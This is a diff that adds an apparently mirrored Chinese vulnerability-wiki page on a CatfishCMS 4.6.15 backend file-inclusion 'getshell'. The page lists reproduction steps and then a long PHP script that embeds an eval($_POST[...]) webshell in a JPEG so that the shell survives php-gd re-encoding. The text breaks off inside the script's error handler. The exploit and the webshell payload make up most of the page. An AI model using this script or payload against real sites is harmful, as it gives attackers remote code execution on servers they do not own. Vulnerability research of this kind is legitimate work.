@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/CatfishCMS/CatfishCMS%204.6.15%20%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>CatfishCMS 4.6.15 后台文件包含getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "CatfishCMS 4.6.15 \u540e\u53f0\u6587\u4ef6\u5305\u542bgetshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../CatfishCMS%E5%90%8E%E5%8F%B0csrf/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../CatfishCMS%E5%90%8E%E5%8F%B0csrf/" class="btn btn-xs btn-link">
+        CatfishCMS后台csrf
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../CatfishCMS%204.6.15%20%E5%89%8D%E5%8F%B0xss/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../CatfishCMS%204.6.15%20%E5%89%8D%E5%8F%B0xss/" class="btn btn-xs btn-link">
+        CatfishCMS 4.6.15 前台xss
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="catfishcms-4615-getshell">CatfishCMS 4.6.15 后台文件包含getshell<a class="headerlink" href="#catfishcms-4615-getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>使用TP的模版函数进行文件包含</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>CatfishCMS 4.6</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞原理<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p>url：</p>
+<div class="codehilite"><pre><span></span><code>http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/admin/Index/newpage.html
+</code></pre></div>
+
+<p>文件地址：\CatfishCMS-4.6.12\application\admin\controller\Index.php</p>
+<p>函数：newpage()</p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId25.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId26.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId27.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId28.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId29.png" /></p>
+<h3 id="_5">复现<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>首先需要制作图片马</p>
+<p>在正常图片中插入shell并无视GD图像库的处理，常规方法有两种</p>
+<div class="codehilite"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="n">对比两张经过php</span><span class="o">-</span><span class="n">gd库转换过的gif图片</span><span class="err">，</span><span class="n">如果其中存在相同之处</span><span class="err">，</span><span class="n">这就证明这部分图片数据不会经过转换</span><span class="err">。</span><span class="n">然后我可以注入代码到这部分图片文件中</span><span class="err">，</span><span class="n">最终实现远程代码执行</span>
+<span class="mf">2.</span><span class="w"> </span><span class="n">利用php</span><span class="o">-</span><span class="n">gd算法上的问题进行绕过</span>
+</code></pre></div>
+
+<p>这里我们选择第二种，使用脚本进行处理图片并绕过</p>
+<div class="codehilite"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="err">上传一张</span><span class="n">jpg图片</span><span class="err">，然后把网站处理完的图片再下回来</span><span class="w"> </span><span class="err">比如</span><span class="n">x</span><span class="o">.</span><span class="n">jpg</span>
+<span class="mf">2.</span><span class="w"> </span><span class="err">执行图片处理脚本脚本进行处理</span><span class="w"> </span><span class="n">php</span><span class="w"> </span><span class="n">jpg_payload</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="n">x</span><span class="o">.</span><span class="n">jpg</span>
+<span class="mf">3.</span><span class="w"> </span><span class="err">如果没出错的话，新生成的文件再次经过</span><span class="n">gd库处理后</span><span class="err">，仍然能保留</span><span class="n">webshell代码语句</span>
+</code></pre></div>
+
+<p>提示：</p>
+<div class="codehilite"><pre><span></span><code><span class="mf">1.</span><span class="w"> </span><span class="n">图片找的稍微大一点</span><span class="w"> </span><span class="n">成功率更高</span>
+<span class="mf">2.</span><span class="w"> </span><span class="n">shell语句越短成功率越高</span>
+<span class="mf">3.</span><span class="w"> </span><span class="n">一张图片不行就换一张</span><span class="w"> </span><span class="n">不要死磕注</span><span class="err">：</span><span class="n">上面的字全部是抄的</span><span class="err">，</span><span class="n">先说明一下不然给人按在地上骂就不好了</span>
+</code></pre></div>
+
+<p>制作过程：</p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId31.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId32.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId33.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId34.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId35.png" /></p>
+<p><img alt="" src="../resource/CatfishCMS4.6.15%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/media/rId36.png" /></p>
+<p>图片马制作脚本</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+<span class="w">    </span><span class="o">/*</span>
+
+<span class="w">    </span><span class="n">The</span><span class="w"> </span><span class="n">algorithm</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">injecting</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">JPG</span><span class="w"> </span><span class="n">image</span><span class="p">,</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">keep</span><span class="w"> </span><span class="n">unchanged</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="n">transformations</span>
+<span class="w">    </span><span class="n">caused</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="n">functions</span><span class="w"> </span><span class="n">imagecopyresized</span><span class="p">()</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">imagecopyresampled</span><span class="p">()</span><span class="o">.</span>
+<span class="w">    </span><span class="n">It</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">necessary</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">quality</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">initial</span><span class="w"> </span><span class="n">image</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">same</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">those</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">processed</span>
+<span class="w">    </span><span class="n">image</span><span class="o">.</span>
+
+<span class="w">    </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">Upload</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">image</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">secured</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="n">upload</span><span class="w"> </span><span class="n">script</span>
+<span class="w">    </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="n">Save</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">processed</span><span class="w"> </span><span class="n">image</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">launch</span><span class="p">:</span>
+<span class="w">    </span><span class="n">php</span><span class="w"> </span><span class="n">jpg_payload</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="o">&lt;</span><span class="n">jpg_name</span><span class="o">.</span><span class="n">jpg</span><span class="o">&gt;</span>
+
+<span class="w">    </span><span class="n">In</span><span class="w"> </span><span class="n">case</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">successful</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">specially</span><span class="w"> </span><span class="n">crafted</span><span class="w"> </span><span class="n">image</span><span class="p">,</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">uploaded</span><span class="w"> </span><span class="n">again</span><span class="o">.</span>
+
+<span class="w">    </span><span class="n">Since</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">most</span><span class="w"> </span><span class="n">straightforward</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">method</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">used</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">problems</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">occur</span><span class="p">:</span>
+<span class="w">    </span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">After</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">second</span><span class="w"> </span><span class="n">processing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">injected</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="n">may</span><span class="w"> </span><span class="n">become</span><span class="w"> </span><span class="n">partially</span><span class="w"> </span><span class="n">corrupted</span><span class="o">.</span>
+<span class="w">    </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">jpg_payload</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">outputs</span><span class="w"> </span><span class="s2">&quot;Something&#39;s wrong&quot;</span><span class="o">.</span>
+<span class="w">    </span><span class="n">If</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">happens</span><span class="p">,</span><span class="w"> </span><span class="n">try</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">change</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">payload</span><span class="w"> </span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">g</span><span class="o">.</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="n">some</span><span class="w"> </span><span class="n">symbols</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">beginning</span><span class="p">)</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">try</span><span class="w"> </span><span class="n">another</span><span class="w"> </span>
+<span class="w">    </span><span class="n">initial</span><span class="w"> </span><span class="n">image</span><span class="o">.</span>
+
+<span class="w">    </span><span class="n">Sergey</span><span class="w"> </span><span class="n">Bobrov</span><span class="w"> </span><span class="err">@</span><span class="n">Black2Fan</span><span class="o">.</span>
+
+<span class="w">    </span><span class="n">See</span><span class="w"> </span><span class="n">also</span><span class="p">:</span>
+<span class="w">    </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">idontplaydarts</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2012</span><span class="o">/</span><span class="mi">06</span><span class="o">/</span><span class="n">encoding</span><span class="o">-</span><span class="n">web</span><span class="o">-</span><span class="n">shells</span><span class="o">-</span><span class="ow">in</span><span class="o">-</span><span class="n">png</span><span class="o">-</span><span class="n">idat</span><span class="o">-</span><span class="n">chunks</span><span class="o">/</span>
+
+<span class="w">    </span><span class="o">*/</span>
+
+<span class="w">    </span><span class="o">$</span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$_POST[eeeeeee]&#39;</span><span class="p">;</span>
+<span class="w">    </span><span class="o">$</span><span class="n">miniPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;?php eval($a); ?&gt;&lt;?php echo phpinfo(); ?&gt;&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="o">/*$</span><span class="n">miniPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&lt;?php echo phpinfo(); ?&gt;&quot;</span><span class="p">;</span><span class="o">*/</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">extension_loaded</span><span class="p">(</span><span class="s1">&#39;gd&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">function_exists</span><span class="p">(</span><span class="s1">&#39;imagecreatefromjpeg&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;php-gd is not installed&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">set_error_handler</span><span class="p">(</span><span class="s2">&quot;custom_error_handler&quot;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">for</span><span class="p">(</span><span class="o">$</span><span class="n">pad</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="o">$</span><span class="n">pad</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">1024</span><span class="p">;</span><span class="w"> </span><span class="o">$</span><span class="n">pad</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="o">$</span><span class="n">nullbytePayloadSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">pad</span><span class="p">;</span>
+<span class="w">        </span><span class="o">$</span><span class="n">dis</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">DataInputStream</span><span class="p">(</span><span class="o">$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">outStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">file_get_contents</span><span class="p">(</span><span class="o">$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">extraBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="o">$</span><span class="n">correctImage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">readShort</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0xFFD8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;Incorrect SOI marker&#39;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="k">while</span><span class="p">((</span><span class="o">!$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">eof</span><span class="p">())</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">readByte</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="o">$</span><span class="n">marker</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">readByte</span><span class="p">();</span>
+<span class="w">            </span><span class="o">$</span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">readShort</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">            </span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">skip</span><span class="p">(</span><span class="o">$</span><span class="n">size</span><span class="p">);</span>
+<span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">marker</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mh">0xDA</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="o">$</span><span class="n">startPos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">seek</span><span class="p">();</span>
+<span class="w">                </span><span class="o">$</span><span class="n">outStreamTmp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
+<span class="w">                    </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">outStream</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">startPos</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span>
+<span class="w">                    </span><span class="o">$</span><span class="n">miniPayload</span><span class="w"> </span><span class="o">.</span><span class="w"> </span>
+<span class="w">                    </span><span class="n">str_repeat</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="o">$</span><span class="n">nullbytePayloadSize</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span>
+<span class="w">                    </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">outStream</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">startPos</span><span class="p">);</span>
+<span class="w">                </span><span class="n">checkImage</span><span class="p">(</span><span class="s1">&#39;_&#39;</span><span class="o">.$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="o">$</span><span class="n">outStreamTmp</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">);</span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">extraBytes</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">while</span><span class="p">((</span><span class="o">!$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">eof</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                        </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">readByte</span><span class="p">()</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mh">0xFF</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                            </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">readByte</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="mh">0x00</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                                </span><span class="k">break</span><span class="p">;</span>
+<span class="w">                            </span><span class="p">}</span>
+<span class="w">                        </span><span class="p">}</span>
+<span class="w">                    </span><span class="p">}</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">stopPos</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">dis</span><span class="o">-&gt;</span><span class="n">seek</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">imageStreamSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">stopPos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="o">$</span><span class="n">startPos</span><span class="p">;</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">outStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>
+<span class="w">                        </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">outStream</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">startPos</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span>
+<span class="w">                        </span><span class="o">$</span><span class="n">miniPayload</span><span class="w"> </span><span class="o">.</span><span class="w"> </span>
+<span class="w">                        </span><span class="n">substr</span><span class="p">(</span>
+<span class="w">                            </span><span class="n">str_repeat</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span><span class="o">$</span><span class="n">nullbytePayloadSize</span><span class="p">)</span><span class="o">.</span>
+<span class="w">                                </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">outStream</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">startPos</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">imageStreamSize</span><span class="p">),</span>
+<span class="w">                            </span><span class="mi">0</span><span class="p">,</span>
+<span class="w">                            </span><span class="o">$</span><span class="n">nullbytePayloadSize</span><span class="o">+$</span><span class="n">imageStreamSize</span><span class="o">-$</span><span class="n">extraBytes</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="w"> </span>
+<span class="w">                                </span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">outStream</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">stopPos</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="n">elseif</span><span class="p">(</span><span class="o">$</span><span class="n">correctImage</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="o">$</span><span class="n">outStream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">$</span><span class="n">outStreamTmp</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">break</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">                </span><span class="k">if</span><span class="p">(</span><span class="n">checkImage</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="o">$</span><span class="n">outStream</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;Success!&#39;</span><span class="p">);</span>
+<span class="w">                </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                    </span><span class="k">break</span><span class="p">;</span>
+<span class="w">                </span><span class="p">}</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">unlink</span><span class="p">(</span><span class="s1">&#39;payload_&#39;</span><span class="o">.$</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">    </span><span class="n">die</span><span class="p">(</span><span class="s1">&#39;Something</span><span class="se">\&#39;</span><span class="s1">s wrong&#39;</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">checkImage</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">unlink</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FALSE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">global</span><span class="w"> </span><span class="o">$</span><span class="n">correctImage</span><span class="p">;</span>
+<span class="w">        </span><span class="n">file_put_contents</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">data</span><span class="p">);</span>
+<span class="w">        </span><span class="o">$</span><span class="n">correctImage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="w">        </span><span class="n">imagecreatefromjpeg</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">$</span><span class="n">unlink</span><span class="p">)</span>
+<span class="w">            </span><span class="n">unlink</span><span class="p">(</span><span class="o">$</span><span class="n">filename</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="o">$</span><span class="n">correctImage</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">function</span><span class="w"> </span><span class="n">custom_error_handler</span><span class="p">(</span><span class="o">$</span><span class="n">errno</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">errstr</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">errfile</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">errline</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">global</span><span class="w"> </span><span class="o">$</span><span class="n">extraBytes</span><span class="p">,</span><span class="w"> </span><span class="o">$</span><span class="n">correctImage</span><span class="p">;</span>
+<span class="w">        </span><span class="o">$</span><span class="n">correctImage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
